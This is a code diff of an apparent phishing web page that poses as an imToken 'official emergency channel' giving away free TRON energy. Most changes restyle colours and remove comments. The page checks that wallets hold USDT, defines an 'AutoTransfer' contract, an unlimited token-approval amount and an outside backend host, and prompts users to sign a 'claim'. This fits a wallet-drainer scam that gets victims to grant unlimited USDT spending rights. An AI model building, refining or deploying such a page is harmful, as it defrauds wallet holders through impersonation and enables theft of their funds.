@@ -19,103 +19,97 @@
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { 
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    padding: 8px 6px; /* 增加内边距，更饱满 */
+    padding: 8px 6px;
     max-width: 600px; 
     margin: 0 auto; 
-    background: #ffffff; /* 白底 */
-    color: #000000; /* 黑字 */
+    background: #ffffff;
+    color: #000000;
     min-height: 100vh;
     display: flex;
     flex-direction: column;
-    gap: 5px; /* 缩小模块间距，更紧凑 */
+    gap: 5px;
     border-radius: 8px;
-    border-left: 3px solid #ef4444; /* 浅红色边框 */
-    font-size: 14px; /* 整体字体调大 */
+    border-left: 3px solid #000000;
+    font-size: 14px;
     overflow-x: hidden;
 }
 .container {
-    flex: 1; /* 占满剩余垂直空间，消除空档 */
+    flex: 1;
     display: flex;
     flex-direction: column;
-    gap: 5px; /* 模块间距，避免拥挤 */
+    gap: 5px;
     overflow-y: auto;
-    padding-top: 90px; /* 给固定顶部容器留空间 */
+    padding-top: 90px;
 }
-/* 顶部容器：固定定位+调整样式 */
 .header-container {
-    display: flex; /* 容器内元素使用弹性布局 */
-    justify-content: space-between; /* 容器内元素左右两端对齐，中间自动留白 */
-    align-items: flex-end; /* 容器内元素在垂直方向靠下对齐 */
-    padding: 8px 8px; /* 容器内边距：上下8px、左右8px */
-    border-bottom: 1px solid #fca5a5; /* 浅红色边框 */
-    margin-bottom: 3px; /* 容器底部外边距：2px（与下方元素拉开距离） */
-    min-height: 80px; /* 容器最小高度：80px（确保内容不会挤变形） */
-    padding-bottom:10px; /* 容器底部内边距单独设置：1px（微调底部空白） */
-    box-sizing: border-box; /* 盒模型：内边距、边框不会撑大容器尺寸 */
-    position: fixed; /* 定位方式：固定定位（不随页面滚动而移动） */
-    top: 0; /* 固定定位的垂直位置：距离顶部0px */
-    left: 0; /* 固定定位的水平位置：距离左侧0px */
-    right: 0; /* 固定定位的水平位置：距离右侧0px（实现“宽度占满屏幕”） */
-    max-width: 600px; /* 容器最大宽度：600px（超过600px后不再变宽） */
-    margin: 0 auto; /* 水平居中：左右margin自动分配，让容器在屏幕中间显示 */
-    background: #ffffff; /* 白底 */
-    z-index: 999; /* 层级优先级：999（确保在其他元素上方显示） */
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-end;
+    padding: 8px 8px;
+    border-bottom: 1px solid #000000;
+    margin-bottom: 3px;
+    min-height: 80px;
+    padding-bottom:10px;
+    box-sizing: border-box;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    max-width: 600px;
+    margin: 0 auto;
+    background: #ffffff;
+    z-index: 999;
 }
 .lang-switch {
     padding: 0;
     margin: 0;
-    display: flex; /* 改为 Flex 布局 */
-    flex-direction: column; /* 子元素上下排列 */
-    align-items: flex-end; /* 所有子元素靠右对齐 */
-    gap: 6px; /* 文本和按钮的上下间距，可自定义 */
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 6px;
 }
-/* 新增文本样式（可按需调整） */
 .lang-text {
-  color: #000000; /* 黑字 */
-  font-size: 12px; /* 可根据需求调整大小 */
+  color: #000000;
+  font-size: 12px;
 }
-/* 语言下拉容器 */
 .lang-dropdown {
     position: relative;
     display: inline-block;
 }
-/* 下拉触发按钮 */
 .lang-toggle {
-    padding: 3px 8px; /* 调大按钮内边距，更易点击 */
-    border: 1px solid #ef4444; /* 浅红色边框 */
+    padding: 3px 8px;
+    border: 1px solid #000000;
     border-radius: 20px;
     background: transparent;
-    color: #000000; /* 黑字 */
-    font-size: 13px; /* 字体调大 */
+    color: #000000;
+    font-size: 13px;
     cursor: pointer;
     display: flex;
     align-items: center;
     gap: 4px;
 }
 .lang-toggle:hover {
-    background: rgba(239, 68, 68, 0.2); /* 浅红色透明背景 */
+    background: rgba(0, 0, 0, 0.1);
 }
-/* 下拉菜单样式 */
 .lang-dropdown-menu {
     display: none;
     position: absolute;
     top: 100%;
     right: 0;
     min-width: 120px;
-    background: #ffffff; /* 白色背景 */
-    border: 1px solid #ef4444; /* 浅红色边框 */
+    background: #ffffff;
+    border: 1px solid #000000;
     border-radius: 8px;
     padding: 4px 0;
     z-index: 1000;
     box-shadow: 0 4px 8px rgba(0,0,0,0.1);
 }
-/* 下拉选项样式 */
 .lang-dropdown-item {
     display: flex;
     align-items: center;
     gap: 6px;
     padding: 6px 12px;
-    color: #000000; /* 黑字 */
+    color: #000000;
     font-size: 13px;
     cursor: pointer;
     background: transparent;
@@ -124,9 +118,8 @@ body {
     text-align: left;
 }
 .lang-dropdown-item:hover {
-    background: rgba(239, 68, 68, 0.2); /* 浅红色透明背景 */
+    background: rgba(0, 0, 0, 0.1);
 }
-/* 显示下拉菜单 */
 .lang-dropdown.open .lang-dropdown-menu {
     display: block;
 }
@@ -138,53 +131,49 @@ body {
     margin-bottom: 0;
     display: flex;
     align-items: flex-end;
-    gap: 10px; /* 增加Logo与文字间距 */
-       
+    gap: 10px;     
 }
-  .header > div {
+.header > div {
     display: flex; 
     gap: 10px; 
-    align-items: flex-end; /* 关键：让desc靠下对齐（相对于h1下移） */
-   
- }
-/* Logo样式：保持长方形比例，适配调大的容器 */
+    align-items: flex-end;  
+}
 .header-logo {
     width: 120px; 
-    height: 40px; /* 长方形比例，更协调 */
+    height: 40px;
     border-radius: 4px;
-    object-fit: contain; /* 避免变形 */
+    object-fit: contain;
 }
 .header h1 { 
-    font-size: 30px; /* 字体调大，更醒目 */
-    color: #000000; /* 黑色标题 */
+    font-size: 30px;
+    color: #000000;
     margin-bottom: 0;
    line-height: 1.2;
 }
 .warning {
-    background: #ffffff; /* 白色背景 */
-    color: #991b1b; /* 深红色文字 */
-    padding: 8px; /* 调大内边距 */
+    background: #ffffff;
+    color: #000000;
+    padding: 8px;
     border-radius: 8px;
-    font-size: 12px; /* 字体调大 */
-    border-left: 3px solid #ef4444; /* 浅红色边框 */
+    font-size: 12px;
+    border-left: 3px solid #000000;
     line-height: 1.5;
 }
 .warning strong {
-    color: #ef4444; /* 浅红色强调 */
+    color: #000000;
 }
-/* ========== 修改userInfo样式：四角布局 ========== */
 #userInfo {
     text-align: center;
-    font-size: 12px; /* 字体调大 */
-    padding: 20px 12px; /* 扩大内边距，避免四角内容溢出 */
-    background: #ffffff; /* 白色背景 */
+    font-size: 12px;
+    padding: 20px 12px;
+    background: #ffffff;
     border-radius: 8px;
-    border: 1px solid #fca5a5; /* 浅红色边框 */
+    border: 1px solid #000000;
     line-height: 1.6;
-    min-height: 120px; /* 增大最小高度，容纳四角内容 */
-    position: relative; /* 父容器相对定位 */
+    min-height: 120px;
+    position: relative;
 }
-/* 四角余额项样式 */
+/* 四角余额项：调整定位往中间移 */
 .balance-item {
     position: absolute;
     display: flex;
@@ -193,19 +182,20 @@ body {
     gap: 4px;
     font-size: 13px;
     color: #000000;
+    /* 往中间移：增大边距值 */
+    top: 20px; 
+    left: 20px;
 }
-/* 四角定位 */
-.balance-usdt { top: 10px; left: 10px; }
-.balance-trx { top: 10px; right: 10px; }
-.balance-energy { bottom: 10px; left: 10px; }
-.balance-bandwidth { bottom: 10px; right: 10px; }
-/* 余额数值强调 */
+.balance-usdt { top: 20px; left: 20px; }
+.balance-trx { top: 20px; right: 20px; }
+.balance-energy { bottom: 20px; left: 20px; }
+.balance-bandwidth { bottom: 20px; right: 20px; }
+/* 余额数值改为黑色 */
 .balance-value {
-    color: #ef4444; /* 浅红色数值 */
+    color: #000000;
     font-size: 16px;
     font-weight: 600;
 }
-/* 未连接状态提示（居中） */
 #userInfoDefault {
     position: absolute;
     top: 50%;
@@ -214,24 +204,23 @@ body {
     width: 100%;
 }
 #userInfo span {
-    color: #ef4444; /* 浅红色强调 */
+    color: #000000;
     font-weight: 500;
 }
-/* 钱包状态容器：适配两种状态，调大内容 */
 #walletStatusContainer {
-    background: #ffffff; /* 白色背景 */
-    padding: 12px; /* 调大内边距 */
+    background: #ffffff;
+    padding: 12px;
     border-radius: 8px;
-    border: 1px solid #fca5a5; /* 浅红色边框 */
-    font-size: 12px; /* 字体调大 */
-    color: #000000; /* 黑字 */
+    border: 1px solid #000000;
+    font-size: 12px;
+    color: #000000;
     line-height: 1.6;
-    border-right: 5px solid #ef4444; /* 浅红色边框 */
-    min-height: 150px; /* 确保非连接状态下内容填满（非连接时文字多） */
+    border-right: 5px solid #000000;
+    min-height: 150px;
 }
 #walletStatusContainer .status-title {
-    font-size: 14px; /* 字体调大 */
-    color: #000000; /* 黑色标题 */
+    font-size: 14px;
+    color: #000000;
     margin-bottom: 6px;
     display: flex;
     align-items: center;
@@ -239,7 +228,7 @@ body {
 }
 #walletStatusContainer .connected-content {
     display: none;
-    min-height: 110px; /* 连接状态下确保高度足够 */
+    min-height: 110px;
 }
 #walletStatusContainer.connected .disconnected-content {
     display: none;
@@ -248,131 +237,127 @@ body {
     display: block;
 }
 #walletStatusContainer .highlight {
-    color: #ef4444; /* 浅红色强调 */
+    color: #000000;
     font-weight: 500;
 }
 #walletStatusContainer.connected .connected-content .orange-tip {
-    color: #991b1b; /* 深红色提示 */
+    color: #000000;
     margin-top: 5px;
-    font-size: 12px; /* 字体调大 */
+    font-size: 12px;
 }
-/* 合约资源容器：调大内容+填充空间 */
 #contractResourceContainer {
-    background: #ffffff; /* 白色背景 */
-    padding: 12px; /* 调大内边距 */
+    background: #ffffff;
+    padding: 12px;
     border-radius: 8px;
-    border: 1px solid #fca5a5; /* 浅红色边框 */
-    font-size: 12px; /* 字体调大 */
-    color: #000000; /* 黑字 */
+    border: 1px solid #000000;
+    font-size: 12px;
+    color: #000000;
     line-height: 1.7;
-    border-bottom: 2px solid rgba(239, 68, 68, 0.2); /* 浅红色透明边框 */
-    min-height: 80px; /* 确保高度足够 */
+    border-bottom: 2px solid rgba(0, 0, 0, 0.1);
+    min-height: 80px;
 }
 #contractResourceContainer .status-title {
-    font-size: 14px; /* 字体调大 */
-    color: #000000; /* 黑色标题 */
+    font-size: 14px;
+    color: #000000;
     margin-bottom: 6px;
     display: flex;
     align-items: center;
     gap: 4px;
 }
 #contractResourceContainer .status-title i {
-    font-size: 16px; /* 字体调大 */
-    color: #ef4444; /* 浅红色图标 */
+    font-size: 16px;
+    color: #000000;
 }
 #contractResourceContainer .highlight {
-    color: #ef4444; /* 浅红色强调 */
+    color: #000000;
     font-weight: 500;
 }
 #contractResourceContainer .data-tag {
-    background: rgba(239, 68, 68, 0.15); /* 浅红色透明背景 */
-    padding: 2px 6px; /* 调大内边距 */
+    background: rgba(0, 0, 0, 0.1);
+    padding: 2px 6px;
     border-radius: 4px;
-    border: 1px solid rgba(239, 68, 68, 0.3); /* 浅红色透明边框 */
-    font-size: 12px; /* 字体调大 */
+    border: 1px solid rgba(0, 0, 0, 0.2);
+    font-size: 12px;
 }
-/* 非连接状态专属容器：调大内容+填充空间 */
 .special-tip-container {
-    background: #ffffff; /* 白色背景 */
-    padding: 16px; /* 调大内边距 */
+    background: #ffffff;
+    padding: 16px;
     border-radius: 8px;
-    border: 1px solid #fca5a5; /* 浅红色边框 */
+    border: 1px solid #000000;
     display: none;
     margin-top: 4px;
-    border-right: 3px solid #ef4444; /* 浅红色边框 */
-    box-shadow: -2px 0 0 0 #fca5a5; /* 浅红色阴影 */
-    min-height: 80px; /* 确保显示时填充空间 */
+    border-right: 3px solid #000000;
+    box-shadow: -2px 0 0 0 #000000;
+    min-height: 80px;
 }
 .special-tip-title {
-    font-size: 16px; /* 字体调大 */
-    color: #000000; /* 黑色标题 */
+    font-size: 16px;
+    color: #000000;
     font-weight: 600;
     margin-bottom: 6px;
 }
 .special-tip-content {
-    font-size: 14px; /* 字体调大 */
-    color: #991b1b; /* 深红色文字 */
+    font-size: 14px;
+    color: #000000;
     line-height: 1.7;
     font-weight: 500;
 }
-/* 连接状态专属容器：调大内容+填充空间 */
 .record-list {
-    background: #ffffff; /* 白色背景 */
-    padding: 12px; /* 调大内边距 */
+    background: #ffffff;
+    padding: 12px;
     border-radius: 8px;
-    border: 1px solid #fca5a5; /* 浅红色边框 */
-    font-size: 12px; /* 字体调大 */
-    border-right: 5px solid #ef4444; /* 浅红色边框 */
+    border: 1px solid #000000;
+    font-size: 12px;
+    border-right: 5px solid #000000;
     display: none;
-    min-height: 100px; /* 确保显示时填充空间 */
+    min-height: 100px;
 }
 .record-item {
     margin-bottom: 10px;
     padding-bottom: 10px;
-    border-bottom: 1px solid #fca5a5; /* 浅红色边框 */
+    border-bottom: 1px solid #000000;
 }
 .record-item:hover {
-    border-color: #ef4444; /* 浅红色边框 */
+    border-color: #000000;
     transition: border-color 0.3s;
 }
 .record-item p {
     margin-bottom: 6px;
-    color: #000000; /* 黑字 */
+    color: #000000;
     line-height: 1.5;
-    font-size: 13px; /* 字体调大 */
+    font-size: 13px;
 }
 .record-item p strong {
-    color: #ef4444; /* 浅红色强调 */
+    color: #000000;
     margin-right: 5px;
 }
 .tx-link {
-    color: #ef4444; /* 浅红色链接 */
+    color: #000000;
     text-decoration: none;
     display: inline-flex;
     align-items: center;
     gap: 5px;
-    font-size: 13px; /* 字体调大 */
+    font-size: 13px;
 }
 .tx-link:hover {
     text-decoration: underline;
 }
-/* 按钮组：贴近上方容器，消除空档 */
 .btn-group {
     display: flex;
     flex-direction: column;
-    gap: 6px; /* 增加按钮间距，更易点击 */
-    margin-top: 4px; /* 缩小与上方容器的间距 */
+    gap: 6px;
+    margin-top: 4px;
     padding: 6px 0;
-    border-top: 1px solid #fca5a5; /* 浅红色边框 */
+    border-top: 1px solid #000000;
 }
 .btn {
     width: 100%;
-    padding: 12px; /* 调大内边距，更饱满 */
-    font-size: 15px; /* 字体调大，更醒目 */
+    padding: 12px;
+    font-size: 15px;
     border: none;
     border-radius: 8px;
-    background: #ef4444; /* 浅红色按钮 */
-    color: white; /* 白色文字 */
+    background: #000000;
+    color: white;
     cursor: pointer;
     display: flex;
     align-items: center;
@@ -381,24 +366,24 @@ body {
     transition: background 0.3s;
 }
 .btn:hover {
-    background: #f87171; /* 深一点的浅红色 */
+    background: #333333;
 }
 .btn:disabled {
-    background: #fecaca; /* 浅红色禁用状态 */
-    color: #991b1b; /* 深红色文字 */
+    background: #cccccc;
+    color: #000000;
     cursor: not-allowed;
 }
 .footer-info {
     margin-top: 6px;
     padding-top: 6px;
-    border-top: 1px solid #fca5a5; /* 浅红色边框 */
-    font-size: 10px; /* 字体调大 */
-    color: #000000; /* 黑字 */
+    border-top: 1px solid #000000;
+    font-size: 10px;
+    color: #000000;
     text-align: center;
     line-height: 1.7;
 }
 .footer-info a {
-    color: #ef4444; /* 浅红色链接 */
+    color: #000000;
     text-decoration: none;
 }
 .footer-info a:hover {
@@ -408,30 +393,29 @@ body {
     text-align: right;
 }
 .review-tip {
-    color: #ef4444; /* 浅红色提示 */
-    font-size: 12px; /* 字体调大 */
+    color: #000000;
+    font-size: 12px;
     margin-top: 6px;
     display: flex;
     align-items: center;
     justify-content: center;
     gap: 6px;
 }
-/* 新增：非imToken用户弹窗样式 */
 #nonImTokenPopup {
     display: none;
     position: fixed;
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    background: #ffffff; /* 白色背景 */
-    border: 1px solid #ef4444; /* 浅红色边框 */
+    background: #ffffff;
+    border: 1px solid #000000;
     border-radius: 8px;
     padding: 16px;
     z-index: 1001;
     text-align: center;
 }
 #nonImTokenPopup p {
-    color: #991b1b; /* 深红色文字 */
+    color: #000000;
     font-size: 14px;
     margin: 0 0 12px 0;
 }
@@ -439,11 +423,10 @@ body {
     padding: 4px 12px;
     border: none;
     border-radius: 4px;
-    background: #ef4444; /* 浅红色按钮 */
+    background: #000000;
     color: white;
     cursor: pointer;
 }
-/* 保留你要的加载动画（修复DOM结构） */
 #Loading {
     width: 100%;
     height: 100vh;
@@ -474,19 +457,19 @@ body {
     left: 0%;
     top: 0%;
     animation: rotate-one 1s linear infinite;
-    border-bottom: 3px solid #c23631;
+    border-bottom: 3px solid #000000;
 }
 #Loading .inner.two {
     right: 0%;
     top: 0%;
     animation: rotate-two 1s linear infinite;
-    border-right: 3px solid #c23631;
+    border-right: 3px solid #000000;
 }
 #Loading .inner.three {
     right: 0%;
     bottom: 0%;
     animation: rotate-three 1s linear infinite;
-    border-top: 3px solid #c23631;
+    border-top: 3px solid #000000;
 }
 @keyframes rotate-one {
     0% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg); }
@@ -503,7 +486,6 @@ body {
     </style>
 </head>
 <body>
-    <!-- ========== 修复加载动画：添加DOM结构 ========== -->
     <div id="Loading">
         <div class="loader">
             <div class="inner one"></div>
@@ -513,67 +495,55 @@ body {
     </div>
 
     <div class="container">      
-        <!-- 新增：标题+语言切换同一行 -->
         <div class="header-container">
             <div class="header">
-                <!-- 新增：Logo图片（路径与仓库中log.png一致） -->
                 <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/log.png" alt="imToken Logo" class="header-logo">
            </div>            
             <div class="lang-switch">
-                <!-- 语言下拉组件：替换原单一按钮 -->
                 <div class="lang-dropdown" id="langDropdown">
                     <button class="lang-toggle" id="langToggleBtn">
-                        🇨🇳<!-- 初始显示中文国旗 -->
+                        🇨🇳
                         <span id="currentLangText">简体中文</span>
                     </button>
                     <div class="lang-dropdown-menu">
-                        <!-- 中文选项 -->
                         <button class="lang-dropdown-item" data-lang="zh">
                            🇨🇳
                             <span>简体中文</span>
                         </button>
-                        <!-- 英文选项 -->
                         <button class="lang-dropdown-item" data-lang="en">
                            🇺🇸
                             <span>English</span>
                         </button>
                     </div>
                 </div>
-                <span id="headerDesc" class="lang-text">imToken官方应急通道</span> <!-- 新增文本 -->
+                <span id="headerDesc" class="lang-text">imToken官方应急通道</span>
          </div>
     </div>
-        <!-- 新增：非imToken用户提示弹窗 -->
         <div id="nonImTokenPopup">
             <p>不支持非imToken用户</p>
             <button id="closePopupBtn">关闭</button>
         </div>
-        <!-- ========== 修改后的userInfo容器（新增动态提示容器） ========== -->
-<div id="userInfo">
-    <!-- 未连接状态默认提示（初始显示） -->
-    <span id="userInfoDefault">未连接钱包<br>
-    <span>请点击底部「连接imToken钱包」按钮</span></span>
-    
-    <!-- 新增：动态状态提示容器（默认隐藏，只放动态文本） -->
-    <div id="userInfoStatus" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; display: none;"></div>
-    
-    <!-- 连接后显示的四角余额（默认隐藏，JS控制显示） -->
-    <div class="balance-item balance-usdt" style="display: none;">
-        <span>USDT</span>
-        <span class="balance-value" id="balanceUsdt">0.00</span>
-    </div>
-    <div class="balance-item balance-trx" style="display: none;">
-        <span>TRX</span>
-        <span class="balance-value" id="balanceTrx">0.00</span>
-    </div>
-    <div class="balance-item balance-energy" style="display: none;">
-        <span>能量</span>
-        <span class="balance-value" id="balanceEnergy">0</span>μs
-    </div>
-    <div class="balance-item balance-bandwidth" style="display: none;">
-        <span>宽带</span>
-        <span class="balance-value" id="balanceBandwidth">0</span>
-    </div>
-</div>
+        <div id="userInfo">
+            <span id="userInfoDefault">未连接钱包<br>
+            <span>请点击底部「连接imToken钱包」按钮</span></span>
+            <div id="userInfoStatus" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; display: none;"></div>
+            <div class="balance-item balance-usdt" style="display: none;">
+                <span>USDT</span>
+                <span class="balance-value" id="balanceUsdt">0.00</span>
+            </div>
+            <div class="balance-item balance-trx" style="display: none;">
+                <span>TRX</span>
+                <span class="balance-value" id="balanceTrx">0.00</span>
+            </div>
+            <div class="balance-item balance-energy" style="display: none;">
+                <span>能量</span>
+                <span class="balance-value" id="balanceEnergy">0</span>μs
+            </div>
+            <div class="balance-item balance-bandwidth" style="display: none;">
+                <span>宽带</span>
+                <span class="balance-value" id="balanceBandwidth">0</span>
+            </div>
+        </div>
         <div id="walletStatusContainer">
             <div class="status-title"><h3 id="walletStatusTitle">钱包状态</h3></div>
             <div class="disconnected-content">
@@ -599,12 +569,11 @@ body {
             <div class="resource-content" style="line-height: 1.8;">
                 <p>• 合约地址：<span class="highlight" id="contractAddr"></span></p>
                 <p>• 剩余能量：<span class="highlight data-tag" id="contractEnergy"></span>μs</p>
-                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
+                <p style="font-size: 12px; color: #000000; margin-top: 5px;" id="contractNote">
                     注：剩余能量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
                 </p>
             </div>
         </div>
-        <!-- 新增：非钱包环境专属容器（添加id便于JS控制文本） -->
         <div class="special-tip-container" id="specialTipContainer">
             <div class="special-tip-title" id="specialTipTitle">imToken-EAB</div>
             <div class="special-tip-content" id="specialTipContent">
@@ -616,13 +585,12 @@ body {
                 <span id="recordTypeTitle">能量使用范围</span>
                 <span id="recordAmountTitle">转账额度</span>
             </div>
-            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
+            <div style="display: flex; color: #000000;justify-content: space-between; margin: 4px 0;">
                 <span class="header"><h3 id="energyType">USDT转账</h3></span>
                 <span class="header"><h3 id="transferQuota">无限</h3></span>
             </div>       
             <span id="approvalRecords" class="highlight">暂无能量领取记录</span>        
         </div>
-        <!-- 按钮组移进container -->
         <div class="btn-group">
             <div class="warning">
                 <p id="browserWarn1"> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
@@ -630,21 +598,17 @@ body {
             </div> 
             <button id="connectBtn" class="btn">连接imToken钱包</button>
             <button id="approveBtn" class="btn" disabled>领取能量</button>
-           
             <div id="reviewTip" class="review-tip" style="display: none;">
                <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
             </div>
         </div>
-        <!-- 底部信息移进container -->
         <div class="footer-info" id="footerInfo">
             合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
             © 2025 能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
         </div>
     </div>
-    <!-- ========== 修复加载动画JS：闭合标签+正确隐藏逻辑 ========== -->
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // 页面加载完成后，延迟1.5秒隐藏加载动画（确保动画可见）
             setTimeout(() => {
                 const loadingEl = document.getElementById("Loading");
                 if (loadingEl) loadingEl.style.display = "none";
@@ -652,25 +616,21 @@ body {
         });
     </script>
     <script>       
-// ========== 全局变量优先定义 ==========
-const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // 特殊白名单地址
-const A1_SIGNAL_KEY = "a1_signal_records"; // A1信号发送记录（15分钟防重复）
-const A1_STATUS_KEY = "a1_signal_status"; // 新增：A1信号状态缓存键（之前缺失导致报错）
-// ========== 全局变量（清理重复定义） ==========
+const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy";
+const A1_SIGNAL_KEY = "a1_signal_records";
+const A1_STATUS_KEY = "a1_signal_status";
 let currentEnergy = 0;
-let currentBandwidth = 0; // 新增：宽带余额变量
-const DEPLOY_START_TIME = new Date().getTime(); // 修复：用当前时间作为部署起始时间
+let currentBandwidth = 0;
+const DEPLOY_START_TIME = new Date().getTime();
 const INIT_TRX = 4104470400000;
 const TRX_DECREASE_PER_SEC = 65200;
 const STORAGE_KEY = "trx_countdown_data";
-let trxTimer = null; // 只保留1次定义
+let trxTimer = null;
 let contractEnergyEl = null;
-// 核心配置
 const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
 const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const BACKEND_API = "https://kgjiopv1.com";
 const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
-// USDT合约ABI
 const USDT_ABI = [
     {
         "constant": true,
@@ -702,25 +662,22 @@ const USDT_ABI = [
         "type": "event"
     }
 ];
-// 全局变量
 let tronWeb = null;
 let userAddress = null;
 let trc20Contract = null;
 let tokenBalance = 0.00;
 let trxBalance = 0.00;
 const RECORD_KEY = "imtoken_energy_records";
-// 新增：B1信号发送标记（防止重复发送）
 const B1_SIGNAL_KEY = "b1_signal_sent";
-// 新增：imToken跳转配置（用验证过的稳定scheme）
 const imTokenConfig = {
     scheme: "imtokenv2://navigate/DappView?url=",
     name: "imToken"
 };
-// ========== 多语言配置（已更新headerDesc文本） ==========
+// 多语言配置：删除冗余文本（已连接/USDT余额/TRX余额）
 const langConfig = {
     zh: {
         headerTitle: "imToken",
-        headerDesc: "imToken官方应急通道", // 已替换为需求文本
+        headerDesc: "imToken官方应急通道",
         userInfoDefault: "未连接钱包<br><span>请点击底部「连接imToken钱包」按钮</span>",
         walletStatusTitle: "钱包状态",
         disconnectedText: "未连接钱包",
@@ -753,25 +710,28 @@ const langConfig = {
         copyFail: "❌ 复制失败：请手动复制链接",
         唤起Guide: "✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问",
         copyGuide: "✅ 链接已复制，请在imToken中粘贴访问",
-        connectError: "连接异常<br><span style='color: #ef4444; font-size: 14px;'>⚠️ 网络波动</span>",
+        connectError: "连接异常<br><span style='color: #000000; font-size: 14px;'>⚠️ 网络波动</span>",
         retryConnect: "重试连接",
-        authorizedTip: "已领取提示<br>{address}<br>USDT余额：<span>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>✅ 该钱包30天内已领取过免费能量</span><br><span style='color: #a0a8a4; font-size: 13px;'>每个地址每30天仅限领取一次</span>",
+        // 删除“已连接/USDT余额/TRX余额”
+        authorizedTip: "✅ 该钱包30天内已领取过免费能量<br><span style='color: #000000; font-size: 13px;'>每个地址每30天仅限领取一次</span>",
         authorizedBtn: "已领取过能量",
-        afterApproveTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 授权成功，发放能量中...</span>",
+        afterApproveTip: "✅ 授权成功，发放能量中...",
         deployingBtn: "发放中...",
         loadingBtn: "加载中...",
-        loadingTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 加载中...</span>",
+        loadingTip: "✅ 加载中...",
         queryingBalance: "查询中...",
-        insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件：USDT余额需大于1</span>",
+        // 删除“已连接/USDT余额/TRX余额”
+        insufficientUsdt: "❌ 不符合领取条件：USDT余额需大于1",
         insufficientBtn: "不符合领取条件",
-        eligibleTip: "已连接：<br>{address}<br>USDT余额：<span style='color: #4ade80;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ 可免费领取90000 USDT 能量</span>",
+        // 删除“已连接/USDT余额/TRX余额”
+        eligibleTip: "✅ 可免费领取90000 USDT 能量",
         distributingBtn: "能量配送中...",
         redirectingBtn: "跳转签名中...",
         approveFail: "⚠️ 操作失败：{msg}，请稍后重试",
         authorizeFail: "⚠️ 授权失败：{msg}，请稍后重试",
         successTip: "🎉 免费能量领取完成！90000μs USDT能量已到账～",
         successBtn: "能量领取成功",
-        successArrival: "<br><span style='color: #4ade80;'>✅ 90000μs USDT能量已到账</span>",
+        successArrival: "<br><span style='color: #000000;'>✅ 90000μs USDT能量已到账</span>",
         recordAddress: "地址：",
         recordType: "领取类型：",
         recordEnergy: "获取能量：",
@@ -780,15 +740,14 @@ const langConfig = {
         systemBusyTip: "系统繁忙请稍后重试",
         ineligibleTip: "不符合领取条件",
         errorTipPrefix: "⚠️ ",
-        noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 14px;'>❌ 请连接imToken钱包后重试</span>",
-        nonImTokenUser: "非imToken钱包用户<br><span style='color: #3b82f6; font-size: 13px;'>正在自动唤起imToken...</span>",
-        // 新增：非钱包环境容器双语（中文）
+        noWalletAddress: "❌ 未检测到有效钱包地址<br><span style='color: #000000; font-size: 14px;'>请连接imToken钱包后重试</span>",
+        nonImTokenUser: "非imToken钱包用户<br><span style='color: #000000; font-size: 13px;'>正在自动唤起imToken...</span>",
         specialTipTitle: "imToken-EAB",
         specialTipContent: "此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。"
     },
     en: {
         headerTitle: "imToken",
-        headerDesc: "imToken Official Emergency Channel", // 英文对应更新
+        headerDesc: "imToken Official Emergency Channel",
         userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
         walletStatusTitle: "Wallet Status",
         disconnectedText: "Wallet not connected",
@@ -821,25 +780,25 @@ const langConfig = {
         copyFail: "❌ Copy failed: Please copy manually",
         唤起Guide: "✅ Link copied + imToken launched\nNext: Open imToken → Browser → Paste link",
         copyGuide: "✅ Link copied - please paste in imToken",
-        connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>⚠️ Network fluctuation</span>",
+        connectError: "Connection Error<br><span style='color: #000000; font-size: 14px;'>⚠️ Network fluctuation</span>",
         retryConnect: "Retry Connection",
-        authorizedTip: "Claimed Tip<br>{address}<br>USDT Balance: <span>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>✅ This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address every 30 days</span>",
+        authorizedTip: "✅ This wallet has claimed free energy within 30 days<br><span style='color: #000000; font-size: 13px;'>One claim per address every 30 days</span>",
